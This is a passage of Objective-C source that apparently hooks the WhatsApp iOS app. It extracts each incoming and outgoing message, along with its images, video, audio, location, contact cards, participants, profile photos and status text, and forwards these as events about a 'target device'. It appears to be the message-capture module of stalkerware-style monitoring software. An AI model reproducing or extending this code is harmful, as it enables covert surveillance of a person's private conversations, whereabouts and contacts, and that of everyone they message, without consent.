                            vcardString	= [IMShareUtils getVCardStringFromData:vcardData];
                        }
                        
                        [WhatsAppUtils sendAnyContentTypeEventUserID:userId
                                                     userDisplayName:userName
                                                   userStatusMessage:senderStatus
                                              userProfilePictureData:senderPicture
                                                        userLocation:nil
                                               messageRepresentation:kIMMessageContact
                                                             message:vcardString	/*[aIncomingEvent vCardStringValue]*/
                                                           direction:kEventDirectionIn
                                                      conversationID:conversationId
                                                    conversationName:conversationName
                                          conversationProfilePicture:conversationPhoto
                                                        participants:participants
                                                         attachments:[NSArray array]
                                                       shareLocation:nil];		
                        
                    }
                    // -- Text
                    else {					
                        DLog (@"--- Text ---")					
                        [WhatsAppUtils sendAnyContentTypeEventUserID:userId
                                                     userDisplayName:userName
                                                   userStatusMessage:senderStatus
                                              userProfilePictureData:senderPicture
                                                        userLocation:nil
                                               messageRepresentation:kIMMessageText
                                                             message:message
                                                           direction:kEventDirectionIn
                                                      conversationID:conversationId
                                                    conversationName:conversationName
                                          conversationProfilePicture:conversationPhoto
                                                        participants:participants
                                                         attachments:[NSArray array]
                                                       shareLocation:nil];
                        
                        
                    }
                    
                    [conversationId release];
                    conversationId = nil;
                    [conversationName release];
                    conversationName = nil;			
                    
                    DLog(@"XMPPMessageStanza ==========> User Name: %@", userName);
                    DLog(@"XMPPMessageStanza ==========> User ID: %@",userId);
                    DLog(@"XMPPMessageStanza ==========> Message: %@",message);
                    //DLog(@"XMPPMessageStanza ==========> FxRecipients: %@",participants);
                    DLog(@"XMPPMessageStanza ==========> Attributes: %@",[aIncomingEvent attributes]);
                    
                    DLog (@"*******************************************************************************************")
                    DLog (@"*******************	    INCOMING WHATSAPP EVENT      *******************");
                    DLog (@"*******************************************************************************************")
                }
            }
        } else {
            DLog (@"Duplicate WhatsApp Incoming Message")
        }
    }
    @catch (NSException *exception) {
        DLog(@"WhatsApp creates event exception: %@", exception);
    }
    @finally {
        ;
    }
}

#pragma mark -

- (BOOL) isWhatsAppVersionChangeProfilePictureNaming {
    BOOL change     = NO;
    NSDictionary *bundleInfo	= [[NSBundle mainBundle] infoDictionary];
    NSString *releaseVersion	= [bundleInfo objectForKey:@"CFBundleShortVersionString"];
    if (releaseVersion == nil || [releaseVersion length] == 0) {
        releaseVersion = [bundleInfo objectForKey:@"CFBundleVersion"];
    }
    
    NSArray *currentVersionArray    = [IMShareUtils parseVersion:releaseVersion];
    NSArray *version2_11_11Array	= [IMShareUtils parseVersion:@"2.11.11"];

    if ([IMShareUtils isVersion:currentVersionArray
                 greaterOrEqual:version2_11_11Array]) {
        DLog (@"WhatsApp => 2.11.11")
        change      = YES;
        
    }
    return change;
}

- (NSString*) getAppShareFolderPath {
    NSURL  *containerURL        = nil;
    NSString *containerString   = nil;
    
    // This method is available on iOS 7 upwards
    if ([[NSFileManager defaultManager]  respondsToSelector:@selector(containerURLForSecurityApplicationGroupIdentifier:)])
        containerURL            = [[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:kWhatsAppAppGroupIdentifier];
    if (containerURL)
        containerString         = containerURL.path;
    return containerString;
}

#pragma mark - *** Outgoing entry method
/**
 - Method name:						createOutgoinWhatsAppEvent:
 - Purpose:							This method is used to  create outgoing whatsapp event
 - Argument list and description:	aOutGoingEvent (id)
 - Return type and description:		No Return 
 */

- (void) createOutgoingWhatsAppEvent: (id) aOutGoingEvent {
	
	DLog (@"********** Outgoing message: %@",(NSString *)[aOutGoingEvent text]);
	DLog (@"********** attributes %@, %@", [aOutGoingEvent class], aOutGoingEvent);
    
    NSString *msgId	= [(NSDictionary *)[(XMPPMessageStanza *)aOutGoingEvent attributes] objectForKey:@"id"];
    DLog (@"> Outgoing msgId %@", msgId)
    
	WhatsAppMessageStore *waMsgStore = [WhatsAppMessageStore shareWhatsAppMessageStore];
	if (![waMsgStore isOutgoingMessageDuplicate:msgId]) {
        
        WAMessage *waMessage = nil;
		NSString *message = (NSString *)[aOutGoingEvent text];
        if (!message) {
            // 2.12.4
            // Cannot get message text from XMPPMessageStanza object for outgoing
            waMessage = [WhatsAppUtils getWAMessageWithID:msgId JID:[aOutGoingEvent toJID]];
            message = [waMessage text];
            DLog(@"waMessage, %@", waMessage);
            DLog(@"message, %@", message);
            WAMediaItem *mediaItem = [waMessage mediaItem];
            DLog(@"mediaItem: %@", mediaItem);
        }
		
		// -- get media type string
        NSString *mediaTypeString = nil;
        if ([aOutGoingEvent respondsToSelector:@selector(mediaType)]) {
            int mediaType = [aOutGoingEvent mediaType];
            mediaTypeString	= [aOutGoingEvent stringForMediaType:mediaType];
        } else { // 2.16.2
            if ([aOutGoingEvent respondsToSelector:@selector(children)]) {
                for (XMPPStanzaElement *child in [aOutGoingEvent children]) {
                    if ([child respondsToSelector:@selector(allAttributes)]) {
                        /*
                         1-1 chat: type of media associates with 'mediatype' attribute
                         Group chat: type of media associates with 'type' attribute
                         */
                        
                        mediaTypeString = [child attributeByName:@"mediatype"];
                        if (!mediaTypeString) {
                            mediaTypeString = [child attributeByName:@"type"];
                        }
                        
                        if (mediaTypeString) {
                            break;
                        }
                    }
                }
            }
        }
		DLog (@"++++++++++ message +++++++++: %@ (media type string: %@) ", message, mediaTypeString)  // for text media type string will be empty string
        
        if (![mediaTypeString length]) { // 2.12.14, for shared location, contact media type string is empty
            if ([waMessage longitude] && [waMessage latitude]) {
                mediaTypeString = @"location";
            } else if ([waMessage vCardString]) {
                mediaTypeString = @"vcard";
            }
        }
		
		if ([self isSupportedWhatsAppContentType:mediaTypeString] || message) {
            /********************************************************************************
             STEP 1:    Find Participant
             ********************************************************************************/
            
			// This 'participantsInfo' does not include the target device's account because it is filter inside this method
			//NSArray *participantsInfo	= [self selectParticipants:msgId];
			NSArray *participantsInfo	= [self selectParticipantsWithMsgID:msgId
												messageSenderToBeFiltered:[mAccountInfo objectForKey:kWhatsAppContactNumber]
																  fromJID:nil];														
			
			// ISSUE WA 2.11.5 (no 1): To fix the issue that the participant querying happens too fast or there is a problem that prevent us from assessing the database			
			NSMutableArray *participantsInfo2	= nil;
			WAChatSession *chatSession			= [[WhatsAppUtils getWAChatStorage] chatSessionForJID:[aOutGoingEvent toJID]];
            DLog(@"chatSession, %@", chatSession);
		
			/*******************************************
				For group chat, groupInfo is not nil.
				For individual chat, groupInfo is nil.
			 *******************************************/			
			if ([chatSession groupInfo]) {							// -- group chat
				participantsInfo2				= [NSMutableArray array];
				NSArray *groupMembers			= [[chatSession groupMembers] allObjects];				
				for (WAGroupMember *eachGroupMember in groupMembers) {
					NSString *contactNumber		= [self formatWhatsAppID:[eachGroupMember memberJID]];
                    DLog(@"eachGroupMemger JID: %@", [eachGroupMember memberJID])
					if (![contactNumber isEqualToString:[mAccountInfo objectForKey:kWhatsAppContactNumber]]) {
						NSDictionary *dict		= [NSDictionary dictionaryWithObjectsAndKeys:
													contactNumber,					kWhatsAppContactNumber,
												   [eachGroupMember contactName],	kWhatsAppContactName,
                                                   [eachGroupMember memberJID],     kWhatsAppContactJID,
												   nil];						
						[participantsInfo2 addObject:dict];
					}
				}											
			} else {												// -- individual chat
				NSDictionary *dict = [NSDictionary dictionaryWithObjectsAndKeys:
									  [self formatWhatsAppID:[chatSession contactJID]],	kWhatsAppContactNumber,
									  [chatSession partnerName],						kWhatsAppContactName,
									  nil];
				
				participantsInfo2 = [NSMutableArray arrayWithObject:dict];
			}
			DLog (@"participantsInfo (1st approach) %@", participantsInfo)
			DLog (@"participantsInfo (2nd approach) %@", participantsInfo2)
			
			// ISSUE WA 2.11.5 (no 1): To fix the issue that the participant querying happens too fast or there is a problem that prevent us from assessing the database
			if (![participantsInfo count])
				participantsInfo = participantsInfo2;	
			
            
            /********************************************************************************
             STEP 2:    Find Conversation
             ********************************************************************************/
            
			//DLog (@"******** chatSesion %@", chatSesion)								
			NSDictionary *conversationInfo	= [[NSDictionary alloc] initWithDictionary:[self findConversationNameIdv2:msgId]];
			DLog (@"conversationInfo %@", conversationInfo)
			
			/* ISSUE WA 2.11.5 (no 2): 
			 To fix the issue that the conversation querying happens too fast or there is a problem that prevent us from assessing the database
			 */
			if (![conversationInfo count]) {
				 conversationInfo			= [[NSDictionary alloc] initWithObjectsAndKeys:
											   [chatSession partnerName],		kConverstaionNameKey,
											   [chatSession contactJID],        kConverstaionIdKey,
											   nil];
			}									
			NSString *conversationName		= [[NSString alloc] initWithString:[conversationInfo objectForKey:kConverstaionNameKey]];			
			NSString *conversationId		= [[NSString alloc] initWithString:[conversationInfo objectForKey:kConverstaionIdKey]];
			[conversationInfo release];
			conversationInfo = nil;
			
			DLog(@"************ aOutGoingEvent %@",		aOutGoingEvent);
			DLog(@"************ media [%@] %@",			[aOutGoingEvent class], [aOutGoingEvent media]);
			DLog(@"************ mediaName %@",			[aOutGoingEvent mediaName]);
			DLog(@"************ mediaURL %@",			[aOutGoingEvent mediaURL]);
            if ([aOutGoingEvent respondsToSelector:@selector(hasMedia)]) {
                // This method is no longer have in 2.11.9
                DLog(@"************ hasMedia %d",       [aOutGoingEvent hasMedia]);
            }
			DLog(@"************ aOutGoingEvent class %@",[aOutGoingEvent class]);
			DLog(@"************ locationName %@",		[aOutGoingEvent locationName]);
			DLog(@"************ locationLongitude %@",	[aOutGoingEvent locationLongitude]);
			DLog(@"************ locationLatitude %@",	[aOutGoingEvent locationLatitude]);
			DLog(@"************ vCardContactName %@",	[aOutGoingEvent vCardContactName]);
			DLog(@"************ vCardStringValue %@",	[aOutGoingEvent vCardStringValue]);
			
			DLog(@"************ mediaTypeString %@",	mediaTypeString);
			DLog(@"************ msgId %@",				msgId);
			DLog(@"************ !!! participantsInfo %@",	participantsInfo);
			DLog(@"************ !!! conversationName %@",	conversationName);
			DLog(@"************ !!! conversationId %@",		conversationId);
            if ([aOutGoingEvent respondsToSelector:@selector(mediaCaption)]) {
                // 2.11.9
                DLog(@"************ mediaCaption %@",	[aOutGoingEvent mediaCaption]);
            }
            if ([aOutGoingEvent respondsToSelector:@selector(thumbnailData)]) {
                DLog(@"************ thumbnailData %@",	[aOutGoingEvent thumbnailData]);
            }
			
            
            /********************************************************************************
             STEP 3:    Account Profile Picture
             ********************************************************************************/
			//====================== My Photo
            
			NSArray *myPaths		= NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
			NSString *pathToPhoto	= [NSString stringWithFormat:@"%@/Media/Profile/Photo.jpg",[myPaths objectAtIndex:0]];
			DLog(@"pathToPhoto %@", pathToPhoto);
            
            // If not found, it's because WhatsApp keeps photo in AppGroup directory on iOS 8
            if (![[NSFileManager defaultManager] fileExistsAtPath:pathToPhoto]) {
                NSString  *appSharePath     = [self getAppShareFolderPath];
                if (appSharePath)
                    pathToPhoto   = [NSString stringWithFormat:@"%@/Media/Profile/Photo.jpg", appSharePath];
            }
			NSData * myPhoto		= [NSData dataWithContentsOfFile:pathToPhoto];
			
            
            DLog(@"WhatsApp Appcount Profile Picture Path %@ data length %lu", pathToPhoto, (unsigned long)[myPhoto length])
            /********************************************************************************
             STEP 4:    Conversation Profile Picture
             ********************************************************************************/
			//====================== MyConversation Picture
            
			NSArray * onlyId                    = [conversationId componentsSeparatedByString:@"@"];
            
			NSString *conversationPhotoPath     = nil;
            UIImage * conversationImage         = nil;
             if (![self isWhatsAppVersionChangeProfilePictureNaming]) {
                 conversationPhotoPath = [NSString stringWithFormat:@"%@/Media/Profile/%@.thumb",[myPaths objectAtIndex:0],[onlyId objectAtIndex:0]];
             } else {
                 if ([chatSession groupInfo]) {                     // Group conversation
                     DLog(@"conversation pic for group")
                     if ([chatSession respondsToSelector: @selector(bestAvailableGroupPicture)]) {
                         conversationImage = [chatSession bestAvailableGroupPicture];
                     } else if ([chatSession respondsToSelector:@selector(groupInfo)]) {
                         WAGroupInfo *groupInfo = chatSession.groupInfo;
                         NSString *appSharePath = [self getAppShareFolderPath];
                         if (appSharePath) {
                             NSString *picturePath = [NSString stringWithFormat:@"%@/%@.jpg", appSharePath, groupInfo.picturePath];
                             DLog(@"WhatsApp Group pic path %@", picturePath)
                             conversationImage = [UIImage imageWithContentsOfFile:picturePath];
                         }
                     }
                 } else {
                     DLog(@"conversation pic for individual")       // Individual conversation
                     Class $WAProfilePictureManager = objc_getClass("WAProfilePictureManager");
                     conversationPhotoPath          = [$WAProfilePictureManager fullPathToProfilePictureThumbnailForJID:[aOutGoingEvent toJID]];
                     conversationImage              = [UIImage imageWithContentsOfFile:conversationPhotoPath];
                     DLog(@"conversationPhotoPath %@", conversationPhotoPath);
                 }
                 
             }
            
 			NSData * conversationPhoto		=  UIImageJPEGRepresentation(conversationImage, 1);
			DLog(@"Conversation photo length %lu", (unsigned long)[conversationPhoto length])
            
            /********************************************************************************
             STEP 5:    Account Status Message
             ********************************************************************************/
			//====================== MyStatus
            
			NSString * myStatus				= [WhatsAppUtils getCurrentStatus];
			DLog(@"currentStatus %@", myStatus);
            
            
            /********************************************************************************
             STEP 6:    Prepare Participant
             ********************************************************************************/

			/// !!! when changing WhatsApp status , the count of participant is 0
			if ([participantsInfo count] != 0) {
                
				NSMutableArray *participants = [NSMutableArray array];
				
                // Prepare participants
				for (NSDictionary *partInfo in participantsInfo) {
                    //====================== participantphoto
					NSArray *myPaths				= NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
                    
                    NSString *pathToPhoto   = nil;
                    
                    if (![self isWhatsAppVersionChangeProfilePictureNaming]) {
                        DLog(@"Old Approach (WhatsApp version below 2.11.11)")
                        pathToPhoto			= [NSString stringWithFormat:@"%@/Media/Profile/%@.thumb",[myPaths objectAtIndex:0],[partInfo objectForKey:kWhatsAppContactNumber]];
                    } else {
                        DLog(@"Find Participant Profile Picture for WhatsApp 2.11.11 up")
                        
                        Class $WAProfilePictureManager      = objc_getClass("WAProfilePictureManager");
                        DLog(@"fullPathToProfilePictureThumbnailForJID %@: %@", [aOutGoingEvent toJID], [$WAProfilePictureManager fullPathToProfilePictureThumbnailForJID:[aOutGoingEvent toJID]])
                        if ([chatSession groupInfo]) {                          // Group conversation
                            DLog(@"get profile for contact in group member %@", partInfo[kWhatsAppContactJID])
                            pathToPhoto = [$WAProfilePictureManager fullPathToProfilePictureThumbnailForJID:partInfo[kWhatsAppContactJID]];
                        } else {                                                // Individual conversation
                            DLog(@"get profile for contact in individual chat %@", [aOutGoingEvent toJID])
                            pathToPhoto = [$WAProfilePictureManager fullPathToProfilePictureThumbnailForJID:[aOutGoingEvent toJID]];
                        }
                    }
					DLog(@"participantsPhoto %@", pathToPhoto);
                    
					UIImage * image					= [UIImage imageWithContentsOfFile:pathToPhoto];
					NSData * participantsPhoto		=  UIImageJPEGRepresentation(image, 1);
					
					//===================== ParticipantStatus
					NSArray * spliter				=  [[partInfo objectForKey:kWhatsAppContactNumber] componentsSeparatedByString:@"@"];
					NSString * participantStatus	= [self getContactStatus:[spliter objectAtIndex:0]];
					DLog(@"ParticipantStatus %@",participantStatus);
                    if (!participantStatus) {
                        WAStatus *waStatus = [[[self class] getWAContactStorage] statusForWhatsAppID:[partInfo objectForKey:kWhatsAppContactNumber]];
                        participantStatus = [waStatus text];
                        DLog(@"waStatus [%@] %@", [waStatus text], waStatus);
                    }
					
					FxRecipient *participant		= [[FxRecipient alloc] init];
					[participant setRecipNumAddr:[partInfo objectForKey:kWhatsAppContactNumber]];
					[participant setRecipContactName:[partInfo objectForKey:kWhatsAppContactName]];
					[participant setMStatusMessage:participantStatus];
					[participant setMPicture:participantsPhoto];
					[participants addObject:participant];
					[participant release];
				}				
						
                
                /********************************************************************************
                 STEP 7:    Send Event by separate the implementation by message type
                 ********************************************************************************/
                
				// -- Image
				if ([mediaTypeString isEqualToString:kWhatsAppContentTypeImage]){		
					DLog (@">>> WhatsApp outgoing image")
					WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
					DLog (@"mediaObj %@", mediaObj)						
					__block NSData *imageData = nil;
					
					if (!mediaObj) {
						imageData = [self getImageForMessageID:msgId];
					} else {
						imageData = UIImageJPEGRepresentation([mediaObj mImage], 0);			// 0 most
					}
                    
                    NSString *caption = nil;
                    if ([aOutGoingEvent respondsToSelector:@selector(mediaCaption)]) {
                        caption = [aOutGoingEvent mediaCaption];
                        if (!caption) {
                            if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                                WAMediaItem *mediaItem = [waMessage mediaItem];
                                DLog(@"mediaItem: %@", mediaItem);
                                if ([mediaItem respondsToSelector:@selector(title)]) {
                                    caption = [mediaItem title];
                                }
                            }
                        }
                    }
                    DLog(@"caption: %@", caption);
                    
                    if (imageData)  {
                        [WhatsAppUtils sendImageContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
                                                       userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
                                                     userStatusMessage:myStatus
                                                userProfilePictureData:myPhoto
                                                             direction:kEventDirectionOut
                                                          imageCaption:caption
                                                        conversationID:conversationId
                                                      conversationName:conversationName
                                            conversationProfilePicture:conversationPhoto
                                                          participants:participants
                                                             photoData:imageData
                                                         thumbnailData:(NSData *)[(XMPPMessageStanza *)aOutGoingEvent thumbnailData]];
                        [[WhatsAppMediaUtils shareWhatsAppMediaUtils] removeMediaObject:mediaObj];									// remove the current media object from array
                    }
                    else {
                        //Wait for image data
                        dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
                        dispatch_async(queue, ^(void) {
                            int retry = 0;
                            while (!imageData) {
                                [NSThread sleepForTimeInterval:2.0];
                                retry++;
                                
                                if (!mediaObj) {
                                    imageData = [self getImageForMessageID:msgId];
                                } else {
                                    imageData = UIImageJPEGRepresentation([mediaObj mImage], 0);			// 0 most
                                }
                                
                                NSString *caption = nil;
                                if ([aOutGoingEvent respondsToSelector:@selector(mediaCaption)]) {
                                    caption = [aOutGoingEvent mediaCaption];
                                    if (!caption) {
                                        if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                                            WAMediaItem *mediaItem = [waMessage mediaItem];
                                            DLog(@"mediaItem: %@", mediaItem);
                                            if ([mediaItem respondsToSelector:@selector(title)]) {
                                                caption = [mediaItem title];
                                            }
                                        }
                                    }
                                }
                                DLog (@"got imageData after retry %d times", retry);
                            }
                            
                            [WhatsAppUtils sendImageContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
                                                           userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
                                                         userStatusMessage:myStatus
                                                    userProfilePictureData:myPhoto
                                                                 direction:kEventDirectionOut
                                                              imageCaption:caption
                                                            conversationID:conversationId
                                                          conversationName:conversationName
                                                conversationProfilePicture:conversationPhoto
                                                              participants:participants
                                                                 photoData:imageData
                                                             thumbnailData:(NSData *)[(XMPPMessageStanza *)aOutGoingEvent thumbnailData]];
                            [[WhatsAppMediaUtils shareWhatsAppMediaUtils] removeMediaObject:mediaObj];									// remove the current media object from array
                        });
                    }
				}
                // -- Gif
                else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeGif]) {
                    DLog (@">>> WhatsApp outgoing image")
                    WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
                    DLog (@"mediaObj %@", mediaObj)
                    
                    NSString *caption = nil;
                    if ([aOutGoingEvent respondsToSelector:@selector(mediaCaption)]) {
                        caption = [aOutGoingEvent mediaCaption];
                        if (!caption) {
                            if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                                WAMediaItem *mediaItem = [waMessage mediaItem];
                                DLog(@"mediaItem: %@", mediaItem);
                                if ([mediaItem respondsToSelector:@selector(title)]) {
                                    caption = [mediaItem title];
                                }
                            }
                        }
                    }
                    DLog(@"caption: %@", caption);
                    
                    NSData * thumbnailData = nil;
                    if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                        WAMediaItem *mediaItem = [waMessage mediaItem];
                        
                        NSArray *myPaths    = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
                        NSString *thumbnailPath         = [NSString stringWithFormat:@"%@/%@",[myPaths objectAtIndex:0], mediaItem.xmppThumbPath];
                        
                        UIImage * thumbnailImage = [UIImage imageWithContentsOfFile:thumbnailPath];
                        thumbnailData =  UIImageJPEGRepresentation(thumbnailImage, 1);
                    }

                    
                    if (thumbnailData)  {
                        [WhatsAppUtils sendImageContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
                                                       userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
                                                     userStatusMessage:myStatus
                                                userProfilePictureData:myPhoto
                                                             direction:kEventDirectionOut
                                                          imageCaption:caption
                                                        conversationID:conversationId
                                                      conversationName:conversationName
                                            conversationProfilePicture:conversationPhoto
                                                          participants:participants
                                                             photoData:nil
                                                         thumbnailData:thumbnailData];
                        [[WhatsAppMediaUtils shareWhatsAppMediaUtils] removeMediaObject:mediaObj];									// remove the current media object from array
                    }
                }
				// -- Video
				else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeVideo]){
					WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
					DLog (@"mediaObj %@", mediaObj)						
					__block NSURL *videoUrl = nil;
															
					if (!mediaObj) {
						NSString *pathToVideo	= [self getMediaPathForMessageID:msgId];
						if (pathToVideo) {
							videoUrl			= [NSURL fileURLWithPath:pathToVideo];
							DLog (@"videoUrl %@", videoUrl)
						}
					} else {
						videoUrl = [mediaObj mVideoAudioUrl];							
					}
                    
                    NSString *caption = nil;
                    if ([aOutGoingEvent respondsToSelector:@selector(mediaCaption)]) {
                        caption = [aOutGoingEvent mediaCaption];
                        if (!caption) {
                            if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                                WAMediaItem *mediaItem = [waMessage mediaItem];
                                DLog(@"mediaItem: %@", mediaItem);
                                if ([mediaItem respondsToSelector:@selector(title)]) {
                                    caption = [mediaItem title];
                                }
                            }
                        }
                    }
                    
                    NSData * thumbnailData = nil;
                    if ([waMessage respondsToSelector:@selector(mediaItem)]) {
                        WAMediaItem *mediaItem = [waMessage mediaItem];
                        
                        NSArray *myPaths    = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES);
                        NSString *thumbnailPath         = [NSString stringWithFormat:@"%@/%@",[myPaths objectAtIndex:0], mediaItem.xmppThumbPath];
                        
                        UIImage * thumbnailImage = [UIImage imageWithContentsOfFile:thumbnailPath];
                        thumbnailData =  UIImageJPEGRepresentation(thumbnailImage, 1);
                    }
					
                    if (videoUrl) {
                        [WhatsAppUtils sendVideoContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
                                                       userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
                                                     userStatusMessage:myStatus
                                                userProfilePictureData:myPhoto
                                                             direction:kEventDirectionOut
                                                          videoCaption:caption
                                                        conversationID:conversationId
                                                      conversationName:conversationName
                                            conversationProfilePicture:conversationPhoto
                                                          participants:participants
                                                             videoPath:videoUrl
                                                         thumbnailData:thumbnailData];
                        [[WhatsAppMediaUtils shareWhatsAppMediaUtils] removeMediaObject:mediaObj];									// remove the current media object from array
                    } else {
                        dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
                        dispatch_async(queue, ^(void) {
                            int retry = 0;
                            NSData *videoThumbnailData = nil;
                            
                            while (!videoUrl) {
                                [NSThread sleepForTimeInterval:2.0];
                                retry++;
                                
                                NSString *pathToVideo	= [self getMediaPathForMessageID:msgId];
                                if (pathToVideo) {
                                    videoUrl			= [NSURL fileURLWithPath:pathToVideo];
                                    DLog (@"New videoUrl %@", videoUrl)
                                }
                                
                                if ([aOutGoingEvent respondsToSelector:@selector(thumbnailData)]) {
                                    videoThumbnailData = (NSData *)[(XMPPMessageStanza *)aOutGoingEvent thumbnailData];
                                }
                                else {
                                    videoThumbnailData = thumbnailData;
                                }
                            }
                            
                            DLog (@"got video url after retry %d times", retry);
                            
                            [WhatsAppUtils sendVideoContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
                                                           userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
                                                         userStatusMessage:myStatus
                                                    userProfilePictureData:myPhoto
                                                                 direction:kEventDirectionOut
                                                              videoCaption:caption
                                                            conversationID:conversationId
                                                          conversationName:conversationName
                                                conversationProfilePicture:conversationPhoto
                                                              participants:participants
                                                                 videoPath:videoUrl
                                                             thumbnailData:videoThumbnailData];
                            [[WhatsAppMediaUtils shareWhatsAppMediaUtils] removeMediaObject:mediaObj];									// remove the current media object from array
                        });
                    }
				}
				// -- audio
				else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeAudio]    ||
                         [mediaTypeString isEqualToString:kWhatsAppContentTypeAudioPTT] ){
					//DLog (@"fullPathForAudioRecord %@", [[WhatsAppUtils getWAChatStorage] fullPathForAudioRecord])
					WhatsAppMediaObject *mediaObj = [[WhatsAppMediaUtils shareWhatsAppMediaUtils] mediaObjectWithMessageID:msgId];
					DLog (@">>> WhatsApp outgoing audio mediaObj %@", mediaObj)
                    __block NSURL *audioUrl = [mediaObj mVideoAudioUrl];
                    if (!audioUrl) {
                        audioUrl = [NSURL URLWithString:[self getMediaPathForMessageID:msgId]];
                    }
                    
                    if (audioUrl) {
                        [WhatsAppUtils sendAudioContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
                                                       userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
                                                     userStatusMessage:myStatus
                                                userProfilePictureData:myPhoto
                                                             direction:kEventDirectionOut
                                                        conversationID:conversationId
                                                      conversationName:conversationName
                                            conversationProfilePicture:conversationPhoto
                                                          participants:participants
                                                             audioPath:audioUrl];
                        [[WhatsAppMediaUtils shareWhatsAppMediaUtils] removeMediaObject:mediaObj];									// remove the current media object from array
                    }
                    else {
                        dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
                        dispatch_async(queue, ^(void) {
                            int retry = 0;
                            while (!audioUrl) {
                                [NSThread sleepForTimeInterval:2.0];
                                retry++;
                                
                                audioUrl = [mediaObj mVideoAudioUrl];
                                if (!audioUrl) {
                                    audioUrl = [NSURL URLWithString:[self getMediaPathForMessageID:msgId]];
                                }
                            }
                            
                            DLog (@"got audio url after retry %d times", retry);
                            
                            [WhatsAppUtils sendAudioContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
                                                           userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
                                                         userStatusMessage:myStatus
                                                    userProfilePictureData:myPhoto
                                                                 direction:kEventDirectionOut
                                                            conversationID:conversationId
                                                          conversationName:conversationName
                                                conversationProfilePicture:conversationPhoto
                                                              participants:participants
                                                                 audioPath:audioUrl];
                            [[WhatsAppMediaUtils shareWhatsAppMediaUtils] removeMediaObject:mediaObj];									// remove the current media object from array
                        });
                    }
				}
				//-- Location
				else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeLocation]){
                    DLog(@"Capture location: %@", [waMessage placeDetails]);
					FxIMGeoTag *location = [[FxIMGeoTag alloc] init];
					[location setMPlaceName:[aOutGoingEvent locationName] ];
					[location setMLongitude:[[aOutGoingEvent locationLongitude]floatValue]];
					[location setMLatitude:[[aOutGoingEvent locationLatitude]floatValue]];
					[location setMHorAccuracy:-1];
                    
                    if (![aOutGoingEvent locationLongitude] || ![aOutGoingEvent locationLatitude]) {
                        if (waMessage) {
                            if ([[waMessage longitude] isKindOfClass:[NSNumber class]] && [[waMessage latitude] isKindOfClass:[NSNumber class]]) {// 2.12.14
                                [location setMPlaceName:[waMessage placeDetails] ];
                                [location setMLongitude:[[waMessage longitude]floatValue]];
                                [location setMLatitude:[[waMessage latitude]floatValue]];
                            }
                            else {// 2.16.7
                                WAMediaItem *mediaItem = [waMessage mediaItem];
                                [location setMPlaceName:[mediaItem vCardName]];
                                [location setMLongitude:[mediaItem longitude]];
                                [location setMLatitude:[mediaItem latitude]];
                            }
                        }
                    }
 					
					[WhatsAppUtils sendAnyContentTypeEventUserID:[mAccountInfo objectForKey:kWhatsAppContactNumber]
												 userDisplayName:[mAccountInfo objectForKey:kWhatsAppContactName]
											   userStatusMessage:myStatus
										  userProfilePictureData:myPhoto
													userLocation:nil
										   messageRepresentation:kIMMessageShareLocation
														 message:message
													   direction:kEventDirectionOut
												  conversationID:conversationId
												conversationName:conversationName
									  conversationProfilePicture:conversationPhoto
													participants:participants
													 attachments:[NSArray array]
												   shareLocation:location];		
					[location release];
					
				}
				//-- Contact
				else if ([mediaTypeString isEqualToString:kWhatsAppContentTypeContact] ||
                         [mediaTypeString isEqualToString:kWhatsAppContentTypeContact2]) {
					//DLog (@"VCARD %@ class %@", [aOutGoingEvent vcard], [[aOutGoingEvent vcard] class])
					//DLog (@"VCARD value %@ ", [[aOutGoingEvent vcard] value])
					
					//NSString *vcardString	= [[NSString alloc] initWithData: (NSData *)[[aOutGoingEvent vcard] value] encoding:NSUTF8StringEncoding];
					
					// get the vcard string from vcard data
					DLog (@"original vcard string %@", [aOutGoingEvent vCardStringValue])
					NSData *vcardData		= [(XMPPStanzaElement *)[aOutGoingEvent vcard] value];					
					NSString *vcardString	= [IMShareUtils getVCardStringFromData:vcardData];
										
					DLog (@"VCARD string value %@ ", vcardString)
                    if (vcardString == nil) {
                        // 2.12.14
                        vcardData = [[waMessage vCardString] dataUsingEncoding:NSUTF8StringEncoding];
                        vcardString	= [IMShareUtils getVCardStringFromData:vcardData];
                    }
																									
